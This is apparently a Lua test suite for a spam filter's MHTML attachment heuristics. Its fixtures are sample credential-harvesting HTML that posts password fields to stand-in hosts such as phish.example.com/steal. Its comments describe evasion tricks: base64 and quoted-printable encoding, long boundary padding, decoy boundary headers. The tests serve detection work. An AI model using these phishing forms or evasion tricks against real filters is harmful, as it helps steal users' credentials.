-- MHTML attachment heuristics (lua_content/mhtml)

context("MHTML attachment heuristics", function()
  local rspamd_task = require "rspamd_task"
  local mhtml = require "lua_content/mhtml"

  local hdrs = "From: <>\nTo: <nobody@example.com>\nSubject: test\n"

  local function get_task()
    local _res, task = rspamd_task.load_from_string(hdrs .. "\n", rspamd_config)
    task:process_message()
    return task
  end

  local function make_mht(boundary, parts)
    local out = {
      "MIME-Version: 1.0\n",
      string.format('Content-Type: multipart/related; boundary="%s"\n\n', boundary),
    }
    for _, p in ipairs(parts) do
      out[#out + 1] = "--" .. boundary .. "\n"
      out[#out + 1] = p .. "\n"
    end
    out[#out + 1] = "--" .. boundary .. "--\n"
    return table.concat(out)
  end

  test("non-MHTML input returns nil", function()
    local task = get_task()
    local res = mhtml.process("just some random text without mime markers", nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("does not classify a regular RFC822 message as MHTML", function()
    local task = get_task()
    local input = "MIME-Version: 1.0\nContent-Type: text/html\n\n<html><script>x()</script></html>"
    local res = mhtml.process(input, nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("clean MHTML produces no phishing flags", function()
    local task = get_task()
    local input = make_mht("XYZBOUNDARY", {
      "Content-Type: text/html\n\n<html><body><p>Hello</p></body></html>\n",
    })
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.tag, 'mhtml')
    assert_false(res.has_password_input)
    assert_false(res.has_scripts)
    task:destroy()
  end)

  test("detects credential harvesting form with password field", function()
    local task = get_task()
    local input = make_mht("XYZBOUNDARY", {
      "Content-Type: text/html\n\n" ..
      "<html><body><form action=\"http://evil.example.com/collect\">" ..
      "<input type=\"password\" name=\"passwd\"></form></body></html>\n",
    })
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_password_input)
    assert_true(res.has_credential_fields)
    assert_true(res.has_forms)
    task:destroy()
  end)

  test("detects embedded scripts and meta refresh", function()
    local task = get_task()
    local input = make_mht("XYZBOUNDARY", {
      "Content-Type: text/html\n\n" ..
      "<html><head><meta http-equiv=\"refresh\" content=\"0;url=http://evil.example.com/\">" ..
      "<script>evil()</script></head><body></body></html>\n",
    })
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_scripts)
    assert_true(res.has_meta_refresh)
    task:destroy()
  end)

  test("extracts URLs from MHTML content", function()
    local task = get_task()
    local input = make_mht("XYZBOUNDARY", {
      "Content-Type: text/html\n\n<html><body><a href=\"http://evil.example.com/phish\">x</a></body></html>\n",
    })
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(#res.urls > 0, "expected at least one URL extracted")
    task:destroy()
  end)

  -- Regression: recognition must key off the OUTER header block only.
  -- Scanning a flat window of the leading bytes accepts a multipart/related
  -- belonging to a nested part, which turns any forwarded message carrying an
  -- ordinary multipart/related section into a scored "MHTML archive".
  test("nested multipart/related under an outer text/plain is not MHTML", function()
    local task = get_task()
    local input = table.concat({
      "Received: from mx.example.com by mx2.example.com; Mon, 1 Jan 2026 00:00:00 +0000",
      "From: <alice@example.com>",
      "To: <bob@example.com>",
      "Subject: Fwd: newsletter",
      "MIME-Version: 1.0",
      "Content-Type: text/plain",
      "",
      "Please see the forwarded message below.",
      "",
      "-------- Forwarded Message --------",
      'Content-Type: multipart/related; boundary="INNER"',
      "",
      "--INNER",
      "Content-Type: text/html",
      "",
      '<html><body><form><input type="password" name="passwd"></form>',
      '<script>x()</script><meta http-equiv="refresh" content="0"></body></html>',
      "--INNER--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("multipart/related on a folded continuation line is not the outer type", function()
    local task = get_task()
    local input = table.concat({
      "MIME-Version: 1.0",
      "Content-Type: text/plain",
      "X-Note: this mentions",
      "\tContent-Type: multipart/related in a folded value",
      "",
      "body text",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("entity without a blank line is not MHTML", function()
    local task = get_task()
    local res = mhtml.process(
      "MIME-Version: 1.0\r\nContent-Type: multipart/related; boundary=\"B\"\r\n",
      nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("outer Content-Type before MIME-Version is still MHTML", function()
    local task = get_task()
    local input = table.concat({
      "From: <Saved by Browser>",
      'Content-Type: multipart/related; boundary="XYZBOUNDARY"',
      "MIME-Version: 1.0",
      "",
      "--XYZBOUNDARY",
      "Content-Type: text/html",
      "",
      "<html><body><script>x()</script></body></html>",
      "--XYZBOUNDARY--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.tag, 'mhtml')
    assert_true(res.has_scripts)
    task:destroy()
  end)

  -- The outer Content-Type check needs a MIME token boundary too, or a
  -- prefix of an unrelated subtype registers as an MHTML wrapper.
  test("multipart/relatedness is not an MHTML wrapper", function()
    local task = get_task()
    local input = "From: <a@example.com>\r\nMIME-Version: 1.0\r\n"
        .. "Content-Type: multipart/relatedness; boundary=\"B\"\r\n\r\n"
        .. "--B\r\nContent-Type: text/html\r\n\r\n<html><script>x()</script></html>\r\n--B--\r\n"
    assert_nil(mhtml.process(input, nil, task))
    task:destroy()
  end)

  test("a hyphenated subtype extending related is not an MHTML wrapper", function()
    local task = get_task()
    local input = "From: <a@example.com>\r\nMIME-Version: 1.0\r\n"
        .. "Content-Type: multipart/related-x; boundary=\"B\"\r\n\r\n"
        .. "--B\r\nContent-Type: text/html\r\n\r\n<html><script>x()</script></html>\r\n--B--\r\n"
    assert_nil(mhtml.process(input, nil, task))
    task:destroy()
  end)

  test("a parameterless multipart/related as the last header is still MHTML", function()
    local task = get_task()
    local input = "From: <a@example.com>\r\nMIME-Version: 1.0\r\n"
        .. "Content-Type: multipart/related\r\n\r\n"
        .. "--B\r\nContent-Type: text/html\r\n\r\n<html><script>x()</script></html>\r\n--B--\r\n"
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_scripts)
    task:destroy()
  end)

  -- An MHT archive stores its HTML however the producer chose. Both usual
  -- choices defeat a scan of the raw archive: base64 leaves no HTML bytes at
  -- all, and quoted-printable escapes '=' as '=3D', so `type="password"`
  -- becomes `type=3D"password"`. Browsers normally emit quoted-printable for
  -- text/html, so this is the common case rather than an exotic evasion.
  local phish_html = '<html><body><form action="http://phish.example.com/steal">'
      .. '<input type="password" name="passwd"></form>'
      .. '<script>x()</script>'
      .. '<meta http-equiv="refresh" content="0;url=http://evil.example.com/go">'
      .. '</body></html>'

  local function qp_encode(s)
    return (s:gsub('[=\128-\255]', function(c)
      return string.format('=%02X', string.byte(c))
    end))
  end

  local function archive(cte, body)
    return table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="BOUND1"',
      "",
      "--BOUND1",
      "Content-Type: text/html; charset=utf-8",
      cte and ("Content-Transfer-Encoding: " .. cte) or "X-Pad: none",
      "",
      body,
      "--BOUND1--",
      "",
    }, "\r\n")
  end

  test("detects indicators in an unencoded inner part", function()
    local task = get_task()
    local res = mhtml.process(archive(nil, phish_html), nil, task)
    assert_not_nil(res, 'plain')
    assert_true(res.has_password_input, 'plain')
    assert_true(res.has_credential_fields, 'plain')
    assert_true(res.has_scripts, 'plain')
    assert_true(res.has_meta_refresh, 'plain')
    task:destroy()
  end)

  test("detects indicators in a quoted-printable inner part", function()
    local task = get_task()
    local res = mhtml.process(
      archive('quoted-printable', qp_encode(phish_html)), nil, task)
    assert_not_nil(res, 'quoted-printable')
    assert_true(res.has_password_input, 'quoted-printable')
    assert_true(res.has_credential_fields, 'quoted-printable')
    assert_true(res.has_scripts, 'quoted-printable')
    assert_true(res.has_meta_refresh, 'quoted-printable')
    task:destroy()
  end)

  test("detects indicators in a base64 inner part", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local res = mhtml.process(
      archive('base64', tostring(rspamd_util.encode_base64(phish_html, 76))), nil, task)
    assert_not_nil(res, 'base64')
    assert_true(res.has_password_input, 'base64')
    assert_true(res.has_credential_fields, 'base64')
    assert_true(res.has_scripts, 'base64')
    assert_true(res.has_meta_refresh, 'base64')
    task:destroy()
  end)

  test("Content-Transfer-Encoding is matched case-insensitively", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local res = mhtml.process(
      archive('BASE64', tostring(rspamd_util.encode_base64(phish_html, 76))), nil, task)
    assert_not_nil(res, 'BASE64')
    assert_true(res.has_password_input, 'BASE64')
    assert_true(res.has_credential_fields, 'BASE64')
    assert_true(res.has_scripts, 'BASE64')
    assert_true(res.has_meta_refresh, 'BASE64')
    task:destroy()
  end)

  test("extracts URLs from an encoded inner part", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local res = mhtml.process(
      archive('base64', tostring(rspamd_util.encode_base64(phish_html, 76))), nil, task)
    assert_not_nil(res)

    local joined = {}
    for _, u in ipairs(res.urls or {}) do joined[#joined + 1] = tostring(u) end
    joined = table.concat(joined, ' ')

    assert_true(joined:find('phish.example.com', 1, true) ~= nil,
        'expected the form action URL from the decoded part')
    task:destroy()
  end)

  test("an archive without a boundary parameter still returns a result", function()
    local task = get_task()
    local input = "From: <a>\r\nMIME-Version: 1.0\r\nContent-Type: multipart/related\r\n\r\n"
        .. phish_html .. "\r\n"
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    -- falls back to the raw scan, which sees this unencoded HTML
    assert_true(res.has_password_input)
    task:destroy()
  end)

  -- A literal substring match on "content-transfer-encoding:" broke as soon
  -- as a continuation-line fold landed inside the header name, leaving the
  -- part treated as already-plain-text and the base64 body scanned as-is.
  test("decodes a base64 inner part whose Content-Transfer-Encoding header name is folded", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local encoded = tostring(rspamd_util.encode_base64(phish_html, 76))
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="BOUND1"',
      "",
      "--BOUND1",
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-\r\n Encoding: base64",
      "",
      encoded,
      "--BOUND1--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res, 'folded CTE header name')
    assert_true(res.has_password_input, 'folded CTE header name')
    task:destroy()
  end)

  -- boundary_re used to search the whole outer header block for the first
  -- "boundary=" occurrence instead of the Content-Type header's own value,
  -- so an unrelated earlier header carrying that text could hijack it.
  test("a decoy header containing boundary= does not hijack the real boundary", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local encoded = tostring(rspamd_util.encode_base64(phish_html, 76))
    local input = table.concat({
      "From: <Saved by Browser>",
      "X-Note: see notes; boundary=decoyvalue",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="REALBOUND"',
      "",
      "--REALBOUND",
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-Encoding: base64",
      "",
      encoded,
      "--REALBOUND--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.part_count, 1,
        'expected the real boundary to be used, got: ' .. tostring(res.part_count))
    assert_true(res.has_password_input, 'decoy boundary header')
    task:destroy()
  end)

  -- split_parts used to match "--boundary" as a plain substring anywhere in
  -- the buffer, so an incidental occurrence inside a part's own content (not
  -- at the start of a line) split the archive in the wrong place and lost
  -- the rest of that part's content to a bogus, header-less fragment.
  test("an incidental boundary-like substring inside a part's content does not split it", function()
    local task = get_task()
    local body = '<html><body><p>ref: xx--REALBOUND-inline-not-a-delimiter</p>'
        .. '<form action="http://phish.example.com/steal">'
        .. '<input type="password" name="passwd"></form></body></html>'
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="REALBOUND"',
      "",
      "--REALBOUND",
      "Content-Type: text/html",
      "",
      body,
      "--REALBOUND--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.part_count, 1,
        'expected exactly one inner part, got: ' .. tostring(res.part_count))
    assert_true(res.has_password_input, 'password field after the incidental substring')
    task:destroy()
  end)

  -- RFC 2046 permits linear whitespace after either delimiter form before
  -- its terminating CRLF. Rejecting it silently skipped all encoded parts.
  test("boundary transport padding does not prevent decoding inner parts", function()
    local rspamd_util = require "rspamd_util"
    local task = get_task()
    local encoded = tostring(rspamd_util.encode_base64(phish_html, 76))
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="PADDED"',
      "",
      "--PADDED \t",
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-Encoding: base64",
      "",
      encoded,
      "--PADDED-- \t",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.part_count, 1, 'padded delimiters must split the part')
    assert_true(res.has_password_input, 'padded delimiters')
    task:destroy()
  end)

  -- RFC 2046 5.1.1 puts no upper bound on transport padding, so any cap on how
  -- much of it is inspected is a detection bypass: a delimiter rejected for
  -- being "too padded" leaves split_parts() with nothing, and the encoded body
  -- behind it never reaches the heuristics. Both lengths here sit far beyond
  -- anything a real producer emits, which is exactly the point - they are what
  -- an attacker would send.
  local function padded_archive(npad)
    local rspamd_util = require "rspamd_util"
    local encoded = tostring(rspamd_util.encode_base64(phish_html, 76))
    local pad = string.rep(" ", npad)

    return table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="PADDED"',
      "",
      "--PADDED" .. pad,
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-Encoding: base64",
      "",
      encoded,
      "--PADDED--" .. pad,
      "",
    }, "\r\n")
  end

  test("transport padding just past a plausible cap still decodes", function()
    local task = get_task()
    local res = mhtml.process(padded_archive(65), nil, task)
    assert_not_nil(res, '65 bytes of padding')
    assert_equal(res.part_count, 1, '65 bytes of padding must still split the part')
    assert_true(res.has_password_input, '65 bytes of padding')
    task:destroy()
  end)

  test("arbitrarily long transport padding still decodes", function()
    local task = get_task()
    local res = mhtml.process(padded_archive(8192), nil, task)
    assert_not_nil(res, '8192 bytes of padding')
    assert_equal(res.part_count, 1, 'long padding must still split the part')
    assert_true(res.has_password_input, '8192 bytes of padding')
    task:destroy()
  end)

  -- LUA_CONTENT_LIMIT states that content went uninspected, so it must not
  -- fire for an archive that happens to have exactly as many parts as the cap
  -- allows: that archive was read in full. Only a part beyond the cap counts.
  local function archive_with_parts(n)
    local t = {
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="B"',
      "",
    }

    for i = 1, n do
      t[#t + 1] = "--B"
      t[#t + 1] = "Content-Type: text/html; charset=utf-8"
      t[#t + 1] = ""
      t[#t + 1] = string.format("<p>part %d</p>", i)
    end

    t[#t + 1] = "--B--"
    t[#t + 1] = ""

    return table.concat(t, "\r\n")
  end

  test("an archive at exactly the part cap is not reported as truncated", function()
    local task = get_task()
    local res = mhtml.process(archive_with_parts(32), nil, task)

    assert_not_nil(res)
    assert_equal(res.part_count, 32, 'all parts must be split')
    local hits = require("lua_content").get_limits(task)
    assert_true(hits == nil or not hits['mhtml:parts'],
        'a complete archive must not claim content went uninspected')
    task:destroy()
  end)

  test("an archive past the part cap is reported as truncated", function()
    local task = get_task()
    local res = mhtml.process(archive_with_parts(33), nil, task)

    assert_not_nil(res)
    assert_equal(res.part_count, 32, 'parts must stop at the cap')
    assert_true(require("lua_content").get_limits(task)['mhtml:parts'],
        'a truncated archive must be reported')
    task:destroy()
  end)

  -- The wrapper trie matches `Content-Type\s*:`, so the header lookup that
  -- finds the boundary and the inner Content-Transfer-Encoding has to accept
  -- the same spelling. Otherwise this archive registers as MHTML, yields no
  -- boundary, and its base64 part is never decoded - the phishing form stays
  -- invisible.
  test("linear whitespace before a header colon does not hide the boundary", function()
    local task = get_task()
    local b64 = tostring(require("rspamd_util").encode_base64(phish_html))
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version : 1.0",
      'Content-Type : multipart/related; boundary="BOUND1"',
      "",
      "--BOUND1",
      "Content-Type : text/html; charset=utf-8",
      "Content-Transfer-Encoding : base64",
      "",
      b64,
      "--BOUND1--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res, 'spaced header names')
    assert_equal(res.part_count, 1, 'boundary must still be found')
    assert_true(res.has_password_input, 'base64 part must still be decoded')
    assert_true(res.has_credential_fields, 'base64 part must still be decoded')
    task:destroy()
  end)

  -- A delimiter line is normally recognised by the newline that ends it, so
  -- the case where the archive simply stops after the delimiter needs its own
  -- branch. An archive whose closing delimiter is the very last thing in the
  -- buffer, with no trailing newline, must still terminate the part cleanly.
  test("a closing delimiter at the very end of the buffer terminates the archive", function()
    local task = get_task()
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="BOUND1"',
      "",
      "--BOUND1",
      "Content-Type: text/html; charset=utf-8",
      "",
      phish_html,
      "--BOUND1--",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res, 'unterminated closing delimiter')
    assert_equal(res.part_count, 1, 'part must be split at the closing delimiter')
    assert_true(res.has_password_input, 'unterminated closing delimiter')
    task:destroy()
  end)

  -- A part body packed with near-miss delimiter lines makes every one of them
  -- a candidate for the delimiter check. That check matches in place rather
  -- than materialising the tail, so this stays linear; what is asserted here
  -- is the correctness half - none of those lines may split the part.
  test("many boundary-like lines in a part body do not split it", function()
    local task = get_task()
    local noise = string.rep("--BOUND1X padding not a delimiter\r\n", 2000)
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="BOUND1"',
      "",
      "--BOUND1",
      "Content-Type: text/html; charset=utf-8",
      "",
      noise .. phish_html,
      "--BOUND1--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.part_count, 1, 'near-miss delimiters must not split the part')
    assert_true(res.has_password_input, 'content after near-miss delimiters')
    task:destroy()
  end)

  -- A closing delimiter must end after optional transport padding. Treating
  -- any "--boundary--..." line as closing lets a malformed lookalike cut off
  -- the remainder of a quoted-printable part before it is decoded.
  test("invalid closing boundary-like content does not terminate a part", function()
    local task = get_task()
    local input = table.concat({
      "From: <Saved by Browser>",
      "MIME-Version: 1.0",
      'Content-Type: multipart/related; boundary="REALBOUND"',
      "",
      "--REALBOUND",
      "Content-Type: text/html; charset=utf-8",
      "Content-Transfer-Encoding: quoted-printable",
      "",
      '<html><body><p>before</p>',
      "--REALBOUND--not-a-delimiter",
      '<form action=3D"http://phish.example.com/steal">',
      '<input type=3D"password" name=3D"passwd"></form></body></html>',
      "--REALBOUND--",
      "",
    }, "\r\n")
    local res = mhtml.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.part_count, 1,
        'invalid closing lookalike must remain part content')
    assert_true(res.has_password_input, 'content after invalid closing lookalike')
    task:destroy()
  end)
end)
